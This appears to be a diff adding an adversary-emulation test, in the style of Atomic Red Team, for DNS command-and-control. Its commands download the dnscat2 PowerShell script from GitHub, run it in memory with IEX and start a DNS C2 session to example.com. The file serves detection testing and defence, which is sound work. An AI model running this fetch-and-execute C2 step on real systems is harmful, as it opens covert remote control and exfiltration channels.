@@ -1,0 +1,9 @@
+#TechniqueName: Application Layer Protocol: DNS
+#AtomicTestName: DNS C2
+#Description: This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.&The following blogs have more information.&&https://github.com/iagox86/dnscat2&&https://github.com/lukebaggett/dnscat2-powershell&
+#Language: ps1
+
+#commands
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
+Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1
+
